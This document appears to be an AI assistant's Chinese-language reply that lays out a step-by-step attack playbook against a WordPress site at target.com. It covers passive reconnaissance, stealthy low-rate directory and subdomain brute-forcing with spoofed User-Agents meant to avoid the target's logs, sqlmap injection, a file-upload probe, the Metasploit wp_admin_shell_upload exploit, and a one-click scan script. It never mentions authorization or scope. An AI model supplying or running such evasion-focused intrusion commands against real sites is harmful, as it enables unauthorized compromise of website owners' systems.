好的，用 `https://target.com` 作为示例，我为你整理一份完整的工具使用顺序和命令，涵盖了从基础扫描到深度利用的完整流程。

---

## 🧅 完整渗透测试工具使用顺序（以 `https://target.com` 为例）

---

### **第一层：外围信息收集（被动，不接触目标）**

**目的：** 在不触发目标日志的情况下，获取尽可能多的公开信息。

```bash
# 1. 基础指纹识别
whatweb https://target.com

# 2. 被动子域名收集（不发送大量 DNS 查询）
sublist3r -d target.com -o subdomains_passive.txt

# 3. 使用 Amass 被动收集
amass enum -passive -d target.com -o amass_passive.txt

# 4. DNS 信息收集
dnsrecon -d target.com -t axfr,goo,ns,soa
```

---

### **第二层：信息收集与路径发现（轻触，低频率）**

**目的：** 利用已知的公开资源获取网站结构，不进行暴力破解。

```bash
# 1. 查看 robots.txt
curl -k -s https://target.com/robots.txt

# 2. 查看 sitemap.xml
curl -k -s https://target.com/sitemap.xml

# 3. 查看站点地图（WordPress 特有）
curl -k -s https://target.com/wordpress/sitemap.xml

# 4. 检查常见敏感文件（使用批量命令）
for file in readme.html license.txt xmlrpc.php wp-login.php .htaccess; do
    echo -n "$file: "
    curl -k -s -o /dev/null -w "%{http_code}" https://target.com/wordpress/$file
    echo ""
done

# 5. 使用 WPScan 进行枚举（仅枚举用户和插件，不爆破密码）
wpscan --url https://target.com/wordpress/ \
--enumerate u,vp,vt \
--disable-tls-checks \
--no-update
```

---

### **第三层：针对性字典爆破（低频、慢速、伪装）**

**目的：** 使用自定义小字典 + 低线程 + 高延迟，只针对确认存在的路径进行扫描。

```bash
# 1. 使用 FFUF 进行 WordPress 核心路径扫描
ffuf -u https://target.com/wordpress/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt \
-mc 200,301,302,403 \
-e .php,.html,.txt \
-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
-k -t 10 -p 0.5-1.5 \
-o ffuf_core.json -of json -v

# 2. 使用 FFUF 扫描插件目录
ffuf -u https://target.com/wordpress/wp-content/plugins/FUZZ/ \
-w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress-plugins.txt \
-mc 200,301,302,403 \
-H "User-Agent: Mozilla/5.0" \
-k -t 10 -p 0.5-1.5 \
-o ffuf_plugins.json -of json -v

# 3. 使用 Gobuster 作为交叉验证
gobuster dir -u https://target.com/wordpress/ \
-w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt \
-x php,html,txt \
-s "200,301,302,403" \
-k -a "Mozilla/5.0" -t 15 \
-o gobuster_core.txt
```

---

### **第四层：深度及子域爆破（主动，高并发）**

**目的：** 在确认目标对低频扫描没有反应后，进行大规模、高并发的暴力破解。

```bash
# 1. 子域名枚举（DNS 爆破）
gobuster dns -d target.com \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-t 30 -i -o subdomains_gobuster.txt

# 2. 使用 FFUF 进行子域名枚举（备选）
ffuf -u https://FUZZ.target.com \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-k -t 20 -p 0.5 \
-o subdomains_ffuf.json -of json -v

# 3. 使用 Amass 主动爆破（备选）
amass enum -active -d target.com -o subdomains_amass_active.txt

# 4. 深度目录爆破（使用大字典）
gobuster dir -u https://target.com/wordpress/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,html,txt,bak,old,log \
-s "200,301,302,403" \
-k -a "Mozilla/5.0" -t 20 \
-o deep_scan.txt

# 5. 使用 Dirsearch（备选）
dirsearch -u https://target.com/wordpress/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-e php,html,txt,bak \
-t 15 --timeout 10 \
-o dirsearch_result.json
```

---

### **第五层：漏洞利用与进一步测试（谨慎，高风险）**

**目的：** 仅在找到明确的漏洞入口后使用。

```bash
# 1. 搜索已知漏洞
searchsploit wordpress 6.0.13
searchsploit contact-form-7
searchsploit all-in-one-seo-pack

# 2. 如果发现 SQL 注入点，使用 sqlmap
sqlmap -u "https://target.com/wordpress/?s=test" --batch --level=2

# 3. 如果找到文件上传漏洞，尝试上传测试文件
curl -k -X POST https://target.com/wordpress/wp-content/plugins/contact-form-7/modules/file.php \
-F "zip=@/tmp/test.txt" \
-H "User-Agent: Mozilla/5.0"

# 4. 如果有 Metasploit 模块
msfconsole
msf > search wordpress
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf > set RHOSTS target.com
msf > run

# 5. 如果找到 REST API 端点，尝试访问
curl -k -s https://target.com/wordpress/wp-json/wp/v2/users
```

---

## 📋 完整执行流程汇总表

| 顺序 | 阶段 | 工具 | 命令示例 | 目标 |
|:---|:---|:---|:---|:---|
| **1** | 外围信息收集 | `whatweb`, `sublist3r` | `whatweb https://target.com` | 获取基础信息 |
| **2** | 信息收集 | `curl`, `wpscan` | `wpscan --url https://target.com/wordpress/ --enumerate u,vp,vt` | 确认路径、用户、插件 |
| **3** | 针对性扫描 | **`ffuf`** | `ffuf -u https://target.com/wordpress/FUZZ -w wordpress.fuzz.txt -mc 200,301,302,403 -e .php,.html,.txt -t 10 -p 0.5` | 发现真实存在的目录 |
| **4** | 深度爆破 | `gobuster` / `dirsearch` | `gobuster dir -u https://target.com/wordpress/ -w directory-list-2.3-medium.txt -x php,html,txt -t 20` | 发现隐藏入口 |
| **5** | 漏洞利用 | `sqlmap`, `msfconsole` | `sqlmap -u "https://target.com/?s=test"` | 获取权限 |

---

## 🚀 一键执行脚本（建议逐步执行）

```bash
#!/bin/bash
# 保存为 scan.sh，然后执行: chmod +x scan.sh && ./scan.sh

TARGET="target.com"
WP_PATH="wordpress"

echo "[+] Phase 1: 基础信息收集"
whatweb https://$TARGET

echo "[+] Phase 2: WPScan 枚举"
wpscan --url https://$TARGET/$WP_PATH/ --enumerate u,vp,vt --disable-tls-checks --no-update

echo "[+] Phase 3: FFUF 针对性扫描"
ffuf -u https://$TARGET/$WP_PATH/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt \
-mc 200,301,302,403 \
-e .php,.html,.txt \
-k -t 10 -p 0.5 \
-o ffuf_scan.json -of json -v

echo "[+] Phase 4: 子域名枚举"
gobuster dns -d $TARGET \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-t 30 -i -o subdomains.txt

echo "[+] 扫描完成！"
```
